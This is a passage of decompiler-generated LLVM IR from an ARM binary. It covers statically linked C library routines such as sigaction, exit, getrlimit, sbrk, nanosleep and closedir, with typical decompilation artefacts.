  %v2_13744 = inttoptr i32 %v1_13744 to i32*
  %v3_13744 = load i32, i32* %v2_13744, align 4
  store i32 %v3_13744, i32* @r3, align 4
  %v1_13748 = and i32 %v3_13744, 67108864
  %v2_13748 = icmp eq i32 %v1_13748, 0
  br i1 %v2_13748, label %dec_label_pc_13750, label %dec_label_pc_13780

dec_label_pc_13750:                               ; preds = %dec_label_pc_13744
  store i32 20, i32* @r2, align 4
  %v2_13754 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13754, i32* @r0, align 4
  %v0_13758 = call i32 @memcpy()
  %v0_13780.pre = load i32, i32* @r5, align 4
  %v0_13788.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13780

dec_label_pc_13780:                               ; preds = %dec_label_pc_13744, %entry, %dec_label_pc_13750
  %v0_13788 = phi i32 [ %arg3, %dec_label_pc_13744 ], [ %arg3, %entry ], [ %v0_13788.pre, %dec_label_pc_13750 ]
  %v0_13784 = phi i32 [ %arg2, %dec_label_pc_13744 ], [ 0, %entry ], [ %v2_13754, %dec_label_pc_13750 ]
  %v0_13780 = phi i32 [ %arg1, %dec_label_pc_13744 ], [ %arg1, %entry ], [ %v0_13780.pre, %dec_label_pc_13750 ]
  %v4_13790 = call i32 @__syscall_rt_sigaction(i32 %v0_13780, i32 %v0_13784, i32 %v0_13788, i32 8)
  store i32 %v3_13724, i32* @r4, align 4
  store i32 %v6_13724, i32* @r5, align 4
  ret i32 %v4_13790

; uselistorder directives
  uselistorder label %dec_label_pc_13780, { 2, 0, 1 }
}

define i32 @function_137a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_137a4:
  %v0_137a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_137a4
  %v2_137a4 = load i32, i32* @r8, align 4
  %v4_137a4 = mul i32 %v2_137a4, 2
  %v5_137a4 = and i32 %v4_137a4, %arg1
  %v2_137a8 = load i32, i32* @ip, align 4
  %v4_137a8 = lshr i32 %v2_137a8, %v5_137a4
  %v5_137a8 = sub i32 32, %v5_137a4
  %v6_137a8 = shl i32 %v2_137a8, %v5_137a8
  %v7_137a8 = or i32 %v6_137a8, %v4_137a8
  %v9_137a8 = and i32 %v7_137a8, %v5_137a4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_137a4, %bb
  %v10_137a8 = phi i32 [ %arg1, %dec_label_pc_137a4 ], [ %v9_137a8, %bb ]
  ret i32 %v10_137a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_137b0 = call i32 @__sigsetjmp()
  ret i32 %v0_137b0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137e0 = load i32, i32* @r7, align 4
  store i32 %v3_137e0, i32* %stack_var_-8, align 4
  %v0_137ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_137ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137ec, -4095
  br i1 %tmp, label %dec_label_pc_13814, label %dec_label_pc_137fc

dec_label_pc_137fc:                               ; preds = %entry
  %v0_13800 = call i32 @__aeabi_read_tp()
  %v3_13804 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13804 = sext i16 %v3_13804 to i32
  %v0_13808 = load i32, i32* %r2.global-to-local, align 4
  %v1_13808 = sub i32 0, %v0_13808
  store i32 %v1_13808, i32* %r2.global-to-local, align 4
  %v3_1380c = add i32 %v4_13804, %v0_13800
  %v4_1380c = inttoptr i32 %v3_1380c to i32*
  store i32 %v1_13808, i32* %v4_1380c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13814.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13814

dec_label_pc_13814:                               ; preds = %entry, %dec_label_pc_137fc
  %v1_13818 = phi i32 [ %v0_137ec, %entry ], [ -1, %dec_label_pc_137fc ]
  %v2_13814 = phi i32 [ %v3_137e0, %entry ], [ %v2_13814.pre, %dec_label_pc_137fc ]
  store i32 %v2_13814, i32* @r7, align 4
  ret i32 %v1_13818

; uselistorder directives
  uselistorder i32 %v0_137ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13814, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_13858, %dec_label_pc_1386c, %entry
  %v0_1382c = phi i32 [ %arg1, %entry ], [ %v0_1382c.pre.pre, %dec_label_pc_1386c ], [ %v0_13858, %dec_label_pc_13858 ]
  store i32 %v0_1382c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1382c, -4095
  br i1 %tmp, label %dec_label_pc_13858, label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_1382c
  %v0_13848 = call i32 @__aeabi_read_tp()
  %v0_1384c = load i32, i32* %r2.global-to-local, align 4
  %v1_1384c = sub i32 0, %v0_1384c
  store i32 %v1_1384c, i32* %r2.global-to-local, align 4
  %v3_13850 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13850 = sext i16 %v3_13850 to i32
  %v3_13854 = add i32 %v4_13850, %v0_13848
  %v4_13854 = inttoptr i32 %v3_13854 to i32*
  store i32 %v1_1384c, i32* %v4_13854, align 4
  %v0_13858.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_1382c, %dec_label_pc_13848
  %v0_13858 = phi i32 [ %v0_1382c, %dec_label_pc_1382c ], [ %v0_13858.pre, %dec_label_pc_13848 ]
  store i32 %v0_13858, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_13858, -4095
  br i1 %tmp4, label %dec_label_pc_1382c, label %dec_label_pc_1386c

dec_label_pc_1386c:                               ; preds = %dec_label_pc_13858
  %v0_1386c = call i32 @__aeabi_read_tp()
  %v0_13870 = load i32, i32* %r2.global-to-local, align 4
  %v1_13870 = sub i32 0, %v0_13870
  store i32 %v1_13870, i32* %r2.global-to-local, align 4
  %v3_13874 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13874 = sext i16 %v3_13874 to i32
  %v3_13878 = add i32 %v4_13874, %v0_1386c
  %v4_13878 = inttoptr i32 %v3_13878 to i32*
  store i32 %v1_13870, i32* %v4_13878, align 4
  %v0_1382c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1382c

; uselistorder directives
  uselistorder i32 %v0_13858, { 0, 2, 1 }
  uselistorder i32 %v0_1382c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13858, { 1, 0 }
  uselistorder label %dec_label_pc_1382c, { 1, 0, 2 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_1388c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13898 = call i32 @getrlimit(i32 7, i32 %v2_1388c)
  %v1_1389c = icmp slt i32 %v2_13898, 0
  %v5_138a0 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_1389c, i32 256, i32 %v5_138a0
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_138c4 = load i32, i32* @r0, align 4
  ret i32 %v1_138c4
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_138d8 = load i32, i32* @r0, align 4
  ret i32 %v1_138d8
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_138ec = load i32, i32* @r0, align 4
  ret i32 %v1_138ec
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_138fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 148) to i32*), align 4
  %v1_13900 = inttoptr i32 %v4_138fc to i32*
  %v2_13900 = load i32, i32* %v1_13900, align 4
  %v2_13904 = icmp eq i32 %v2_13900, 0
  br i1 %v2_13904, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_1390c = phi i32 [ %v2_13900, %entry ], [ 4096, %bb ]
  ret i32 %v1_1390c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13944, label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %entry
  %v1_13930 = sub i32 0, %arg1
  %v3_13934 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13934 = sext i16 %v3_13934 to i32
  %v0_13938 = call i32 @__aeabi_read_tp()
  %v3_1393c = add i32 %v4_13934, %v0_13938
  %v4_1393c = inttoptr i32 %v3_1393c to i32*
  store i32 %v1_13930, i32* %v4_1393c, align 4
  br label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %entry, %dec_label_pc_1392c
  %v1_13948 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1392c ]
  ret i32 %v1_13948

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13944, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13950 = load i32, i32* @r7, align 4
  store i32 %v3_13950, i32* %stack_var_-8, align 4
  %v0_1395c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1395c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1395c, -4095
  br i1 %tmp, label %dec_label_pc_13984, label %dec_label_pc_1396c

dec_label_pc_1396c:                               ; preds = %entry
  %v0_13970 = call i32 @__aeabi_read_tp()
  %v3_13974 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13974 = sext i16 %v3_13974 to i32
  store i32 %v4_13974, i32* @r3, align 4
  %v0_13978 = load i32, i32* %r2.global-to-local, align 4
  %v1_13978 = sub i32 0, %v0_13978
  store i32 %v1_13978, i32* %r2.global-to-local, align 4
  %v3_1397c = add i32 %v4_13974, %v0_13970
  %v4_1397c = inttoptr i32 %v3_1397c to i32*
  store i32 %v1_13978, i32* %v4_1397c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13984.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13984

dec_label_pc_13984:                               ; preds = %entry, %dec_label_pc_1396c
  %v1_13988 = phi i32 [ %v0_1395c, %entry ], [ -1, %dec_label_pc_1396c ]
  %v2_13984 = phi i32 [ %v3_13950, %entry ], [ %v2_13984.pre, %dec_label_pc_1396c ]
  store i32 %v2_13984, i32* @r7, align 4
  ret i32 %v1_13988

; uselistorder directives
  uselistorder i32 %v0_1395c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13984, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_139a0 = load i32, i32* @r0, align 4
  ret i32 %v1_139a0
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_139a4 = load i32, i32* @r4, align 4
  store i32 %v3_139a4, i32* %stack_var_-12, align 4
  %v0_139b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139b4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_139b4, -4095
  br i1 %tmp, label %dec_label_pc_139dc, label %dec_label_pc_139c4

dec_label_pc_139c4:                               ; preds = %entry
  %v0_139c8 = call i32 @__aeabi_read_tp()
  %v3_139cc = load i16, i16* @global_var_20d6c.590, align 2
  %v4_139cc = sext i16 %v3_139cc to i32
  %v0_139d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_139d0 = sub i32 0, %v0_139d0
  store i32 %v1_139d0, i32* %r2.global-to-local, align 4
  %v3_139d4 = add i32 %v4_139cc, %v0_139c8
  %v4_139d4 = inttoptr i32 %v3_139d4 to i32*
  store i32 %v1_139d0, i32* %v4_139d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_139dc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_139dc

dec_label_pc_139dc:                               ; preds = %entry, %dec_label_pc_139c4
  %v1_139e0 = phi i32 [ %v0_139b4, %entry ], [ -1, %dec_label_pc_139c4 ]
  %v2_139dc = phi i32 [ %v3_139a4, %entry ], [ %v2_139dc.pre, %dec_label_pc_139c4 ]
  store i32 %v2_139dc, i32* @r4, align 4
  ret i32 %v1_139e0

; uselistorder directives
  uselistorder i32 %v0_139b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139dc, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139e8 = load i32, i32* @r7, align 4
  store i32 %v3_139e8, i32* %stack_var_-8, align 4
  %v0_139f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_139f4, -4095
  br i1 %tmp, label %dec_label_pc_13a1c, label %dec_label_pc_13a04

dec_label_pc_13a04:                               ; preds = %entry
  %v0_13a08 = call i32 @__aeabi_read_tp()
  %v3_13a0c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13a0c = sext i16 %v3_13a0c to i32
  %v0_13a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a10 = sub i32 0, %v0_13a10
  store i32 %v1_13a10, i32* %r2.global-to-local, align 4
  %v3_13a14 = add i32 %v4_13a0c, %v0_13a08
  %v4_13a14 = inttoptr i32 %v3_13a14 to i32*
  store i32 %v1_13a10, i32* %v4_13a14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13a1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a1c

dec_label_pc_13a1c:                               ; preds = %entry, %dec_label_pc_13a04
  %v1_13a20 = phi i32 [ %v0_139f4, %entry ], [ -1, %dec_label_pc_13a04 ]
  %v2_13a1c = phi i32 [ %v3_139e8, %entry ], [ %v2_13a1c.pre, %dec_label_pc_13a04 ]
  store i32 %v2_13a1c, i32* @r7, align 4
  ret i32 %v1_13a20

; uselistorder directives
  uselistorder i32 %v0_139f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a1c, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a28 = load i32, i32* @r7, align 4
  store i32 %v3_13a28, i32* %stack_var_-8, align 4
  %v0_13a34 = load i32, i32* @r0, align 4
  store i32 %v0_13a34, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a34, -4095
  br i1 %tmp, label %dec_label_pc_13a5c, label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %entry
  %v0_13a48 = call i32 @__aeabi_read_tp()
  %v3_13a4c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13a4c = sext i16 %v3_13a4c to i32
  %v0_13a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a50 = sub i32 0, %v0_13a50
  store i32 %v1_13a50, i32* %r2.global-to-local, align 4
  %v3_13a54 = add i32 %v4_13a4c, %v0_13a48
  %v4_13a54 = inttoptr i32 %v3_13a54 to i32*
  store i32 %v1_13a50, i32* %v4_13a54, align 4
  %v2_13a5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13a5c:                               ; preds = %entry, %dec_label_pc_13a44
  %v1_13a60 = phi i32 [ %v0_13a34, %entry ], [ -1, %dec_label_pc_13a44 ]
  %v2_13a5c = phi i32 [ %v3_13a28, %entry ], [ %v2_13a5c.pre, %dec_label_pc_13a44 ]
  store i32 %v2_13a5c, i32* @r7, align 4
  ret i32 %v1_13a60

; uselistorder directives
  uselistorder i32 %v0_13a34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a5c, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_13a74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12828) to i32*), align 4
  %v2_13a78 = icmp eq i32 %v4_13a74, 0
  %v3_13a7c = load i32, i32* @r4, align 4
  %v9_13a7c = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13a78, label %dec_label_pc_13a8c, label %entry.dec_label_pc_13a94_crit_edge

entry.dec_label_pc_13a94_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13a94

dec_label_pc_13a8c:                               ; preds = %entry
  store i32 %v3_13a7c, i32* @r4, align 4
  store i32 %v9_13a7c, i32* @r6, align 4
  %v0_13a90 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_13a94

dec_label_pc_13a94:                               ; preds = %entry.dec_label_pc_13a94_crit_edge, %dec_label_pc_13a8c
  %v0_13a94 = call i32 @__libc_enable_asynccancel()
  %v0_13a98 = load i32, i32* @r6, align 4
  store i32 %v0_13a98, i32* @r1, align 4
  store i32 %v0_13a94, i32* @r5, align 4
  %v0_13aa0 = load i32, i32* @r4, align 4
  store i32 %v0_13aa0, i32* @r0, align 4
  %v0_13aa4 = call i32 @__syscall_nanosleep()
  store i32 %v0_13aa4, i32* @r4, align 4
  %v0_13aac = load i32, i32* @r5, align 4
  %v1_13ab0 = call i32 @__libc_disable_asynccancel(i32 %v0_13aac)
  %v0_13ab4 = load i32, i32* @r4, align 4
  ret i32 %v0_13ab4

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 13, 7, 12, 1, 3, 2, 6, 5, 11, 4, 10, 9, 8, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 13, 7, 12, 1, 3, 2, 6, 5, 11, 4, 10, 9, 8, 0 }
  uselistorder label %dec_label_pc_13a94, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13ac8 = load i32, i32* @r4, align 4
  store i32 %v3_13ac8, i32* %stack_var_-16, align 4
  store i32 11572, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r4.global-to-local, align 4
  %v4_13ad8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 11572) to i32*), align 4
  %v2_13adc = icmp eq i32 %v4_13ad8, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_13adc, label %dec_label_pc_13ae8, label %dec_label_pc_13af8

dec_label_pc_13ae8:                               ; preds = %entry
  %v1_13aec = call i32 @__GI_brk(i32 0)
  %v1_13af0 = icmp slt i32 %v1_13aec, 0
  br i1 %v1_13af0, label %dec_label_pc_13b1c, label %dec_label_pc_13af8thread-pre-split

dec_label_pc_13af8thread-pre-split:               ; preds = %dec_label_pc_13ae8
  %v0_13afc.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_13af8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13af8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_13af8thread-pre-split, %entry
  %v1_13af8 = phi i32 [ %v1_13af8.pre, %dec_label_pc_13af8thread-pre-split ], [ 11572, %entry ]
  %v0_13af8 = phi i32 [ %v0_13af8.pre, %dec_label_pc_13af8thread-pre-split ], [ ptrtoint (i32* @global_var_20d14.594 to i32), %entry ]
  %v1_13b0c = phi i32 [ %v0_13afc.pr, %dec_label_pc_13af8thread-pre-split ], [ %arg1, %entry ]
  %v2_13af8 = add i32 %v0_13af8, %v1_13af8
  %v3_13af8 = inttoptr i32 %v2_13af8 to i32*
  %v4_13af8 = load i32, i32* %v3_13af8, align 4
  %v2_13afc = icmp eq i32 %v1_13b0c, 0
  store i32 %v4_13af8, i32* %r4.global-to-local, align 4
  br i1 %v2_13afc, label %dec_label_pc_13b20, label %dec_label_pc_13b08

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13af8
  %v2_13b0c = add i32 %v4_13af8, %v1_13b0c
  %v1_13b10 = call i32 @__GI_brk(i32 %v2_13b0c)
  %v1_13b14 = icmp slt i32 %v1_13b10, 0
  br i1 %v1_13b14, label %dec_label_pc_13b1c, label %dec_label_pc_13b08.dec_label_pc_13b20_crit_edge

dec_label_pc_13b08.dec_label_pc_13b20_crit_edge:  ; preds = %dec_label_pc_13b08
  %v0_13b20.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b20

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13b08, %dec_label_pc_13ae8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %dec_label_pc_13af8, %dec_label_pc_13b08.dec_label_pc_13b20_crit_edge, %dec_label_pc_13b1c
  %v0_13b20 = phi i32 [ %v0_13b20.pre, %dec_label_pc_13b08.dec_label_pc_13b20_crit_edge ], [ -1, %dec_label_pc_13b1c ], [ %v4_13af8, %dec_label_pc_13af8 ]
  %v2_13b24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13b24, i32* @r4, align 4
  ret i32 %v0_13b20

; uselistorder directives
  uselistorder i32 %v4_13af8, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_13b20, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_13b44 = load i32, i32* @r0, align 4
  ret i32 %v1_13b44
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_13b4c = load i32, i32* %arg1, align 4
  store i32 %v2_13b4c, i32* %r3.global-to-local, align 4
  %v3_13b54 = icmp eq i32 %v2_13b4c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r6, align 4
  br i1 %v3_13b54, label %dec_label_pc_13b68, label %dec_label_pc_13b84

dec_label_pc_13b68:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_d1f4.128 to i32), i32* %r2.global-to-local, align 4
  %v0_13b6c = call i32 @__aeabi_read_tp()
  %v3_13b70 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13b70 = sext i16 %v3_13b70 to i32
  store i32 %v4_13b70, i32* %r2.global-to-local, align 4
  %v0_13b74 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13b74, i32* %r1.global-to-local, align 4
  %v1_13b78 = add i32 %v0_13b74, 10
  store i32 %v1_13b78, i32* %r3.global-to-local, align 4
  %v3_13b7c = add i32 %v4_13b70, %v0_13b6c
  %v4_13b7c = inttoptr i32 %v3_13b7c to i32*
  store i32 %v1_13b78, i32* %v4_13b7c, align 4
  %v0_13c2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c2c

dec_label_pc_13b84:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_13b88 = add i32 %tmp, 24
  store i32 %v1_13b88, i32* %r2.global-to-local, align 4
  %v4_13b90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 68) to i32*), align 4
  store i32 %v4_13b90, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13b9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b9c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13bb4 = load i32, i32* @r6, align 4
  %v2_13bb4 = add i32 %v0_13bb4, 16
  %v3_13bb4 = inttoptr i32 %v2_13bb4 to i32*
  %v4_13bb4 = load i32, i32* %v3_13bb4, align 4
  call void @__pseudo_branch(i32 %v4_13bb4)
  %v0_13bc0 = load i32, i32* @r7, align 4
  %v1_13bc0 = inttoptr i32 %v0_13bc0 to i32*
  %v2_13bc0 = load i32, i32* %v1_13bc0, align 4
  store i32 %v2_13bc0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_13bd0 = load i32, i32* @r8, align 4
  store i32 %v0_13bd0, i32* %v1_13bc0, align 4
  %v0_13bd4 = load i32, i32* @r6, align 4
  %v1_13bd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_13bd4 = add i32 %v1_13bd4, %v0_13bd4
  %v3_13bd4 = inttoptr i32 %v2_13bd4 to i32*
  %v4_13bd4 = load i32, i32* %v3_13bd4, align 4
  store i32 ptrtoint (i32* @global_var_13be0.809 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13bd4)
  %v0_13be0 = load i32, i32* @r7, align 4
  %v1_13be0 = add i32 %v0_13be0, 12
  %v2_13be0 = inttoptr i32 %v1_13be0 to i32*
  %v3_13be0 = load i32, i32* %v2_13be0, align 4
  store i32 %v3_13be0, i32* @r0, align 4
  %v0_13be4 = call i32 @free()
  %v0_13be8 = load i32, i32* @r7, align 4
  store i32 %v0_13be8, i32* @r0, align 4
  %v0_13bec = call i32 @free()
  %v0_13bf4 = load i32, i32* @r4, align 4
  store i32 %v0_13bf4, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_13bf4, -4095
  br i1 %tmp11, label %dec_label_pc_13c28, label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13b84
  store i32 ptrtoint (i32* @global_var_d14c.411 to i32), i32* %r3.global-to-local, align 4
  %v0_13c14 = call i32 @__aeabi_read_tp()
  %v3_13c18 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_13c18 = sext i16 %v3_13c18 to i32
  store i32 %v4_13c18, i32* %r3.global-to-local, align 4
  %v0_13c1c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c1c = sub i32 0, %v0_13c1c
  store i32 %v1_13c1c, i32* %r2.global-to-local, align 4
  %v3_13c20 = add i32 %v4_13c18, %v0_13c14
  %v4_13c20 = inttoptr i32 %v3_13c20 to i32*
  store i32 %v1_13c1c, i32* %v4_13c20, align 4
  %v0_13c24 = load i32, i32* @r8, align 4
  br label %dec_label_pc_13c28

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13b84, %dec_label_pc_13c10
  %v0_13c28 = phi i32 [ %v0_13bf4, %dec_label_pc_13b84 ], [ %v0_13c24, %dec_label_pc_13c10 ]
  store i32 %v0_13c28, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13c2c

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13b68, %dec_label_pc_13c28
  %v0_13c2c = phi i32 [ %v0_13c2c.pre, %dec_label_pc_13b68 ], [ %v0_13c28, %dec_label_pc_13c28 ]
  ret i32 %v0_13c2c

; uselistorder directives
  uselistorder i32 %v0_13bf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c2c, { 1, 0 }
  uselistorder label %dec_label_pc_13c28, { 1, 0 }
}

define i32 @function_13c44(i32 %arg1) local_unnamed_addr {
dec_label_pc_13c44:
  %v0_13c44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c44, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13c44
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13c44, %bb
  %v7_13c54 = phi i32 [ %arg1, %dec_label_pc_13c44 ], [ 0, %bb ]
